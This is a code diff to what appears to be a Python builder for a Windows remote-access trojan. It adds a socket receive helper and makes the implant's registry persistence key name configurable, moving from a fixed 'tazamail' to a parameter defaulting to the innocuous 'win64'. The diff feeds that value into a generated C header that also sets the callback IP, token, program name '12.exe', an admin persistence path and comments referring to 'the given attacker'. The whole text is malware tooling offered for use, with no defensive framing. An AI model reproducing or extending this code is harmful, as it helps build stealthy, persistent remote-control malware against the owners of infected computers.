@@ -48,6 +48,21 @@ def recvall(sock,buffer):
     sock.settimeout(None)
     return result
 
+def recvsafe(sock,buffer):
+    #Receives a single data 
+    result =b""
+    sock.settimeout(SOCK_TIMEOUT)
+    while True:
+        try:            
+            data = sock.recv(buffer)
+        except socket.timeout:
+            #print("Timeout")
+            break
+        else:
+            return data
+
+    sock.settimeout(None)
+    return result #empty return
 
 def printColor(status,message):
     ERROR_COLOR = "\033[31m" #red
@@ -125,6 +140,7 @@ def commonHeader():
 #define TIMEOUT 3000//2 seconds for reconnect to server during a disconnection
 #define TOKEN "|GENERATE_TOKEN|" //the token
 #define NAME_PROG "12.exe" //Name of prog
+#define NAME_KEY_REGISTER  "win64" 
 
 #define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
 #define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
@@ -137,7 +153,6 @@ def commonHeader():
 #define TIMEOUT_SOCK 5 // DO NOT TOUCH 
 #define SLEEP_RECV 200 // DO NOT TOUCH 
 #define TIMEOUT_POPEN 7 // DO NOT TOUCH
-#define NAME_KEY_REGISTER  "tazamail" // DO NOT TOUCH
 #define SPLIT "|SPLIT|" 
 
 #endif
@@ -148,7 +163,7 @@ $USER is changed by the user who executed the program.
 """
     return header
 
-def customHeader(ip, auto, port, reco, name, token): 
+def customHeader(ip, auto, port, reco, name, token, registry): 
     #In order not to have an error you need 4 \.
     #Example C:\ = C:\\\\
     header = """
@@ -164,6 +179,7 @@ def customHeader(ip, auto, port, reco, name, token):
 #define TIMEOUT {} //2 seconds for reconnect to server during a disconnection
 #define NAME_PROG "{}" //Name of prog
 #define TOKEN "{}"
+#define NAME_KEY_REGISTER  "{}" 
 
 #define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
 #define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
@@ -175,12 +191,11 @@ def customHeader(ip, auto, port, reco, name, token):
 #define TIMEOUT_SOCK 5 // DO NOT TOUCH 
 #define SLEEP_RECV 200 // DO NOT TOUCH 
 #define TIMEOUT_POPEN 7 // DO NOT TOUCH
-#define NAME_KEY_REGISTER  "tazamail" // DO NOT TOUCH
 #define SPLIT "|SPLIT|" 
 
 
 #endif
 
-""".format(ip, port, auto, reco, name,token)
+""".format(ip, port, auto, reco, name,token, registry)
 
     return header
